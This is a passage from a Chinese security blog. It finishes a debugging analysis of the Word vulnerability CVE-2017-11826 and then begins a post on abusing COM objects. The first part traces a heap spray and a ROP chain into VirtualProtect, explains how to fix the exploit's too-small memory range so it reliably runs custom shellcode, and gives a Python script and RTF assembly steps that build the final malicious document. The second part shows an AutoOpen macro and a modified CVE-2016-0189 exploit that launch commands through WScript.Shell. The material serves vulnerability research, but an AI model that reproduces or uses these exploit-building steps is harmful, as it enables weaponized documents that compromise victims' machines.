<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802165001758.png" alt="image-20210802165001758" /></p>

<p>于是在父函数和崩溃函数同时下断，查看标签解析情况：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bp wwlib+3fa5a ".printf \"Parent_Func:	\"; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"
bp wwlib+385ce6 ".printf \"Crash_Func:	\"; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802170632918.png" alt="image-20210802170632918" /></p>

<p>在父函数成功解析到font标签，猜测因为font标签未闭合而导致崩溃函数解析标签出错产生漏洞，修改了xml文件闭合了font标签：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804145041151.png" alt="image-20210804145041151" /></p>

<p>将修改后的docx文件嵌入到新建的rtf文件中，在windbg中调试后发现eax的值改变了，并且没有异常，证实因为font标签未闭合导致的漏洞。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802180616278.png" alt="image-20210802180616278" /></p>

<p>继续调试发现异常触发点的eax和ecx都是来自于esi，而esi为漏洞函数的arg1：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803145832128.png" alt="image-20210803145832128" /></p>

<p>因此在漏洞函数打印标签以及[[esi+17f0]]、[[esi+17f0]+8]、[[esi+17f0]+c]和[esi+17f0]的值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bp wwlib+385ce6 "du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); r $t0=poi(poi(esp+4)+17f0); dd poi($t0) L1; dd poi($t0)+8 L1; dd poi($t0)+c L1; dd $t0 L1; .printf\"\\n\"; g;"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803162436403.png" alt="image-20210803162436403" /></p>

<p>打印出的结构就是Taglist结构体，具体结构参考goabout2的<a href="https://www.cnblogs.com/goabout2/p/8186018.html">office CVE-2017-11826杂谈</a>一文。</p>

<p>接着调试异常触发点上的函数，发现函数功能为通过层级标签获取TagObject Array[Index-2]：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803192637477.png" alt="image-20210803192637477" /></p>

<p>继续向上追溯，发现函数GetTagObject也调用了GetTagObjectByIndex，通过分析发现该函数获取的是TagObject Array[Index-1]的地址：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803193709068.png" alt="image-20210803193709068" /></p>

<p>分析到这里，漏洞产生的原因也就出来了，由于word每解析一个标签，Current_Index的值就加一，当解析到闭合标签，Current_Index值会减1。由于构造了没有闭合的font标签，因此导致在解析idmap标签时比正常文件的Current_Index多一，导致原本应该获取OLEObject标签的TagObject变成获取了font的TagObject，因此造成了标签类型混淆导致漏洞的发生。</p>

<p>将标签层级和xml文件标签对应：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803164645125.png" alt="image-20210803164645125" /></p>

<p>可以证实确实因为Current_Index值比正常文件的多一导致的类型混淆。</p>

<p>在内存中查看当解析idmap层级为6时Taglist的内存结构：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; bp wwlib+4da16b
&gt; g
Breakpoint 1 hit
eax=070f1800 ebx=00000000 ecx=0225466c edx=00000004 esi=0225466c edi=070f19dc
eip=6f95a16b esp=002cf428 ebp=002cf490 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
wwlib!DllGetLCID+0x2cc775:
6f95a16b e840f7b2ff      call    wwlib!DllGetClassObject+0x42d4 (6f4898b0)
&gt; ub $ip L8
wwlib!DllGetLCID+0x2cc75d:
6f95a153 83780401        cmp     dword ptr [eax+4],1
6f95a157 0f85f5bdeaff    jne     wwlib!DllGetLCID+0x17855c (6f805f52)
6f95a15d 8bb6f0170000    mov     esi,dword ptr [esi+17F0h]
6f95a163 8b06            mov     eax,dword ptr [esi]
6f95a165 8b10            mov     edx,dword ptr [eax]
6f95a167 4a              dec     edx
6f95a168 4a              dec     edx
6f95a169 8bce            mov     ecx,esi
</code></pre></div></div>

<p>此时eax的值即为Taglist，因此查看eax指向的Taglist结构：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803215207578.png" alt="image-20210803215207578" /></p>

<p>此时TagObject[4]+0x44的值为<code class="language-plaintext highlighter-rouge">0x090b4000</code>，查看该值在内存中存储的数据：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803213913808.png" alt="image-20210803213913808" /></p>

<p>发现[[TagObject[4]+0x44]+0x44]的值正是xml文件中font标签构造的固定地址，自此漏洞部分分析完毕。</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>先启动word然后使用windbg附加会导致堆喷无法成功，继而无法分析漏洞利用部分。因此使用gflags.exe让调试器直接加载winword.exe：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803220115994.png" alt="image-20210803220115994" /></p>

<p>设置断点在异常触发点：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; bp wwlib+4da184
&gt; g
Breakpoint 0 hit
eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004b44b4 edi=0340cddc
eip=6e2da184 esp=002f5f14 ebp=002f5f7c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
wwlib!DllGetLCID+0x2cc78e:
6e2da184 50              push    eax
0:000&gt; u $ip
wwlib!DllGetLCID+0x2cc78e:
6e2da184 50              push    eax
6e2da185 ff5104          call    dword ptr [ecx+4]
6e2da188 e9fabdeaff      jmp     wwlib!DllGetLCID+0x178591 (6e185f87)
6e2da18d 83f802          cmp     eax,2
6e2da190 750f            jne     wwlib!DllGetLCID+0x2cc7ab (6e2da1a1)
6e2da192 83c624          add     esi,24h
6e2da195 56              push    esi
6e2da196 52              push    edx
&gt; dd ecx+4
088883f0  72980e2b 72980e2b 72980e2b 72980e2b
08888400  72980e2b 72980e2b 72980e2b 72980e2b
08888410  72980e2b 72980e2b 72980e2b 72980e2b
08888420  72980e2b 72980e2b 72980e2b 72980e2b
08888430  72980e2b 72980e2b 72980e2b 72980e2b
08888440  72980e2b 72980e2b 72980e2b 72980e2b
08888450  72980e2b 72980e2b 72980e2b 72980e2b
08888460  72980e2b 72980e2b 72980e2b 72980e2b
</code></pre></div></div>

<p>发现exc+4的值为activeX1.bin中shellcode下方的填充，说明已经成功堆喷。</p>

<p>步入[exc+4]后发现来到了msvbvm60.dll，已经进入了ROP链：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; t
eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004c44b4 edi=0043cddc
eip=72980e2b esp=00385a18 ebp=00385a88 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
msvbvm60!IID_IVbaHost+0x127eb:
72980e2b 94              xchg    eax,esp
</code></pre></div></div>

<p>而第一条指令则是用来栈迁移，在之前已经将eax入栈，而eax的值正是构造好的<code class="language-plaintext highlighter-rouge">0x088888ec</code>，执行指令后，esp的值已经变成了<code class="language-plaintext highlighter-rouge">0x088888ec</code>：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803223544350.png" alt="image-20210803223544350" /></p>

<p>而eax中的内容刚好位于shellcode的上方，此时ROP链为滑板指令，循环执行<code class="language-plaintext highlighter-rouge">pop eax</code>和<code class="language-plaintext highlighter-rouge">ret</code>，此时可以下断<code class="language-plaintext highlighter-rouge">bp 729440cc ".if(esp=08888f48){}.else{gc}"</code>停在了滑板指令结束的位置：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804102057063.png" alt="image-20210804102057063" /></p>

<p>当执行到最后一次滑板指令时，会将<code class="language-plaintext highlighter-rouge">0x729410d0</code>放入eax中，而该值是msvbvm60.dll的IAT表中的数据，查看后存储的是VirtualProtect的地址：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804103009190.png" alt="image-20210804103009190" /></p>

<p>紧接着通过ret跳转到ROP指令<code class="language-plaintext highlighter-rouge">jmp [eax]</code>执行VirtualProtect，而此时栈中为构造好的VirtualProtect的参数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104003516.png" alt="image-20210804104003516" /></p>

<p>再次跳转后进入到kernelbase.dll的VirtualProtect：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104216392.png" alt="image-20210804104216392" /></p>

<p>执行后会跳转到<code class="language-plaintext highlighter-rouge">0x08888f70</code>执行shellcode：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804104652987.png" alt="image-20210804104652987" /></p>

<p>然而VirtualProtect的修改的内存范围只有<code class="language-plaintext highlighter-rouge">0x08888c90 - 0x08888e91</code>，而shellcode却位于<code class="language-plaintext highlighter-rouge">0x08888f70</code>，因此会触发c0000005访问异常，shellcode执行失败：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804105857160.png" alt="image-20210804105857160" /></p>

<h2 id="利用改造">利用改造</h2>

<p>activeX1.bin文件中布局如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804115244951.png" alt="image-20210804115244951" /></p>

<p>由于原本VirtualProtect修改的范围为0x201不够，因此修改为0x1000确保能够覆盖shellcode，随后将shellcode替换为自己的shellcode即可。</p>

<p>将修改好的activeX1.bin文件替换到rtfobj.py提取出来进行堆喷的文档中，并修改为.docx，脚本参考<a href="https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/">Exploiting Word: CVE-2017-11826</a>一文，替换脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">zipfile</span>

<span class="n">template_path</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">final_docx_name</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">activeX_bin_path</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">def</span> <span class="nf">pack_file_to_open_xml_docx</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">,</span> <span class="n">activeX_bin_path</span><span class="p">):</span> 
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">template_path</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">activeX_bin_path</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Template docx file or activeX.bin file not exist."</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">activeX_bin_path</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_</span><span class="p">:</span> 
        <span class="n">object_bin_data</span> <span class="o">=</span> <span class="n">f_</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">zip_docx</span> <span class="o">=</span> <span class="n">template_path</span> <span class="o">+</span> <span class="s">".zip"</span>
    <span class="n">current_dir</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">abspath</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
    <span class="n">new_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">current_dir</span><span class="p">,</span> <span class="s">"exp"</span><span class="p">,</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">basename</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">))</span> 
    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">new_path</span><span class="p">):</span>
        <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">new_path</span><span class="p">)</span>

    <span class="n">shutil</span><span class="p">.</span><span class="n">copy</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">new_path</span><span class="p">)</span> 
    <span class="n">zip_docx</span> <span class="o">=</span> <span class="n">new_path</span>
    <span class="c1"># open temp docx and a copy for modification 
</span>    <span class="n">zin</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> 
    <span class="n">zip_docx_copy</span> <span class="o">=</span> <span class="n">zip_docx</span> <span class="o">+</span> <span class="s">"_copy_"</span> 
    <span class="n">zout</span> <span class="o">=</span> <span class="n">zipfile</span><span class="p">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_docx_copy</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span>
    <span class="c1"># modify the docx template with exploit 
</span>    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">zin</span><span class="p">.</span><span class="n">infolist</span> <span class="p">():</span>
        <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">"activeX1"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">".bin"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span> 
            <span class="k">pass</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">buffer</span> <span class="o">=</span> <span class="n">zin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">item</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
            <span class="n">zout</span><span class="p">.</span><span class="n">writestr</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">)</span> <span class="c1"># use existing file
</span>            
    <span class="n">zout</span><span class="p">.</span><span class="n">writestr</span><span class="p">(</span><span class="s">"word/activeX/"</span> <span class="o">+</span> <span class="s">"activeX1.bin"</span><span class="p">,</span> <span class="n">object_bin_data</span><span class="p">)</span> 
    <span class="n">zout</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span> 
    <span class="n">zin</span><span class="p">.</span><span class="n">close</span> <span class="p">()</span>
    <span class="c1"># convert to docx
</span>    <span class="n">os</span><span class="p">.</span><span class="n">rename</span> <span class="p">(</span><span class="n">zip_docx_copy</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">)</span> 
    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">zip_docx</span><span class="p">)</span>

<span class="n">pack_file_to_open_xml_docx</span><span class="p">(</span><span class="n">template_path</span><span class="p">,</span> <span class="n">final_docx_name</span><span class="p">,</span> <span class="n">activeX_bin_path</span><span class="p">)</span>
</code></pre></div></div>

<p>新建一个rtf文件，将替换好的docx文件添加到rtf文件中，保存后使用010Editor打开，搜索object，将{\object和{*\objdata的全部内容复制:</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804120429898.png" alt="image-20210804120429898" /></p>

<p>再新建一个rtf文件，按照堆喷射、Bypass ASLR和漏洞触发的顺序添加三个对象。堆喷射的内容就是上方复制好的内容，其他两个可以直接在原EXP中复制过来即可，最终EXP的结构如下所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141320122.png" alt="image-20210804141320122" /></p>

<p>最终成功执行了shellcode：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804141657444.png" alt="image-20210804141657444" /></p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://www.anquanke.com/post/id/87122">CVE-2017-11826漏洞分析、利用及动态检测</a></p>

<p>[2] <a href="https://www.cnblogs.com/goabout2/p/8186018.html">office CVE-2017-11826杂谈</a></p>

<p>[3] <a href="https://www.greyhathacker.net/?p=911">SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE</a></p>

<p>[4] <a href="https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/">Exploiting Word: CVE-2017-11826</a></p>

<p>[5] <a href="https://www.anquanke.com/post/id/103080">Open XML标签解析类漏洞分析思路</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。]]></summary></entry><entry><title type="html">COM对象的利用与挖掘</title><link href="http://localhost:4000/2021-07-28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98" rel="alternate" type="text/html" title="COM对象的利用与挖掘" /><published>2021-07-28T00:00:00+08:00</published><updated>2021-07-28T00:00:00+08:00</updated><id>http://localhost:4000/2021-07-28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98</id><content type="html" xml:base="http://localhost:4000/2021-07-28/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98"><![CDATA[<h1 id="前言">前言</h1>

<p>本文在FireEye的研究<a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">Hunting COM Objects[1]</a>的基础上，讲述COM对象在IE漏洞、shellcode和Office宏中的利用方式以及如何挖掘可利用的COM对象，获取新的漏洞利用方式。<!--more--></p>

<h1 id="com对象简述">COM对象简述</h1>

<p>COM(微软组件对象模型)，是一种独立于平台的分布式系统，用于创建可交互的二进制软件组件。 COM 是 Microsoft 的 OLE (复合文档) 和 ActiveX (支持 Internet 的组件) 技术的基础技术。</p>

<p>注册表项：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID</code>下，包含COM对象的所有公开的信息，图中显示了Wscript.Shell对象在注册表中的信息：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/Wscript.Shell对象.png" alt="Wscript.Shell对象" /></p>

<p>其中<code class="language-plaintext highlighter-rouge">{72C24DD5-D70A-438B-8A42-98424B88AFB8}</code>就是该对象的CLSID。如果将COM对象比作人的话，CLSID就相当于身份证号，每个COM对象的CLSID都是唯一且不重复的。当然，如果只有身份证号，会有很多不方便的情况，于是便有自己的名字。COM对象中的ProgID就相当于它的名字，图中的COM对象ProgID为WScript.Shell.1：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ProgID.png" alt="ProgID" /></p>

<p>而InProcServer32表示该COM对象位于哪个PE文件中，图中表示WScript.Shell对象位于<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wshom.ocx</code>中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/InProcServer32.png" alt="InProcServer32" /></p>

<p>有了上述的信息后，接下来便可以通过这些信息去使用COM对象了。</p>

<h1 id="com对象的利用">COM对象的利用</h1>

<p>COM对象可以通过脚本语言（VBS、JS）、高级语言（C++）和powershell创建。接下来分别介绍这三种创建方式。</p>

<h2 id="脚本语言创建com对象">脚本语言创建COM对象</h2>

<p>通过脚本语言，我们可以很轻易的创建一个COM对象，使用VBS创建Wscript.Shell对象：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim Shell
Set Shell = CreateObject("Wscript.Shell")
Shell.Run "cmd /c calc.exe"
</code></pre></div></div>

<p>运行效果如图：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/运行VBS.png" alt="运行VBS" /></p>

<p><code class="language-plaintext highlighter-rouge">CreateObject</code>方法使用COM对象的ProgID：Wscript.Shell来创建对象，创建完成后便能调用该对象的Run方法通过cmd起calc。除了使用ProgID，还可以使用Wscript.Shell对象的CLSID来创建：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim Shell
Set Shell = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
Shell.Run "cmd /c calc.exe"
</code></pre></div></div>

<p>这种方法的好处是当想要创建的COM对象没有ProgID时，便可以通过CLSID进行创建。接下来对<a href="https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html">CVE-2016-0189[2]</a>的EXP进行改造，将EXP中如下vbs代码替换成创建Wscript.Shell即可。</p>

<p>替换前：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' Execute cmd
Set Object = CreateObject("Shell.Application")
Object.ShellExecute "cmd"
</code></pre></div></div>

<p>替换后：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' Execute cmd
Dim Shell
Set Shell = CreateObject("Wscript.Shell")
Shell.Run "cmd /c calc.exe"
</code></pre></div></div>

<p>最终实现效果：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/改造EXP.png" alt="改造EXP" /></p>

<p>接下来讲述COM对象在Office宏中的利用，以Office2019为例，在word文档中创建如下宏代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub AutoOpen()
Dim Shell
Set Shell = CreateObject("Wscript.Shell")
Shell.Run "cmd /c calc.exe"
End Sub
</code></pre></div></div>

<p>打开文件后，会提示宏已被禁用：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/宏安全提示.png" alt="宏安全提示" /></p>

<p>点击启用宏后，使用cmd起计算器：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/word起calc.png" alt="word起calc" /></p>

<p>用法和IE中一致，就不再赘述了。</p>

<h2 id="通过高级语言创建com对象">通过高级语言创建COM对象</h2>

<p>如果想通过高级语言（这里以C++为例）使用COM对象的话，必须要明白微软定义的COM三大接口类：<a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown">IUnknown[3]</a>、<a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory">IClassFactory[4]</a>和<a href="https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch">IDispatch[5]</a>。</p>

<p>参考<a href="https://blog.csdn.net/weiwangchao_/article/details/6949264">COM三大接口:IUnknown、IClassFactory、IDispatch[6]</a>一文。COM规范规定任何组件、任何接口都必须从IUnknown继承，IUnknown内包含3个函数：QueryInterface、AddRef和Release。QueryInterface用于查询组件实现的其它接口，AddRef用于增加引用计数，Release用于减少引用计数。根据本人的理解，QueryInterface用来获取IClassFactory类的的接口，AddRef和Release用于控制装载后InProcServer32所在PE文件的生命周期。当引用计数大于0时，内存中始终存在一个PE文件可以创建COM对象，当引用计数等于0时，系统会将内存中的PE文件释放掉，也就无法对该COM对象进行任何操作了。</p>

<p>IClassFactory的作用是创建COM组件，通过类中CreateInstance函数即可创建一个可以使用的COM对象。有了对象还不够，必须要使用对象中的各种函数来执行功能，于是便要使用IDispatch接口类来获取函数和执行函数。</p>

<p>IDispatch叫做调度接口，IDispatch类中的GetIDsOfNames函数可以通过IClassFactory创建的COM对象的函数名获取对应的函数ID（IID），通过这个ID就可以使用IDispatch类中的Invoke函数来执行COM对象中方法。最后将相关的资源使用IUnknown-&gt;Release函数释放，即可完成一次完整的COM对象调用过程。图中所示就是具体的实现流程：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/image-20210630154827820.png" alt="word起calc" /></p>

<p>不过在实际使用中，并不会直接使用IUnknown接口类的函数，因为极易因为程序员的疏忽忘记释放一个接口或者多释放一个接口导致错误，因此使用图中函数CoCreateInstance就能直接创建一个类的接口。也就是说一个函数封装了IUnknown类和IClassFactory类的功能，能够简化流程。</p>

<p>下面是创建WScript.Shell对象，使用Run方法起powershell的完整代码：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _WIN32_DCOM
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
<span class="cp">#include</span> <span class="cpf">&lt;comdef.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma comment(lib, "stdole2.tlb")
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HRESULT</span> <span class="n">hres</span><span class="p">;</span>

    <span class="c1">// Step 1: ------------------------------------------------</span>
    <span class="c1">// 初始化COM组件. ------------------------------------------</span>

    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoInitializeEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">COINIT_MULTITHREADED</span><span class="p">);</span>

    <span class="c1">// Step 2: ------------------------------------------------</span>
    <span class="c1">// 初始化COM安全属性 ---------------------------------------</span>

    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoInitializeSecurity</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>                          <span class="c1">// COM negotiates service</span>
        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Authentication services</span>
        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Reserved</span>
        <span class="n">RPC_C_AUTHN_LEVEL_DEFAULT</span><span class="p">,</span>   <span class="c1">// Default authentication </span>
        <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="c1">// Default Impersonation</span>
        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Authentication info</span>
        <span class="n">EOAC_NONE</span><span class="p">,</span>                   <span class="c1">// Additional capabilities </span>
        <span class="nb">NULL</span>                         <span class="c1">// Reserved</span>
    <span class="p">);</span>
    <span class="c1">// Step 3: ---------------------------------------</span>
    <span class="c1">// 获取COM组件的接口和方法 -------------------------</span>
    <span class="n">LPDISPATCH</span> <span class="n">lpDisp</span><span class="p">;</span>
    <span class="n">CLSID</span> <span class="n">clsidshell</span><span class="p">;</span>
    <span class="n">hres</span> <span class="o">=</span> <span class="n">CLSIDFromProgID</span><span class="p">(</span><span class="s">L"WScript.Shell"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clsidshell</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
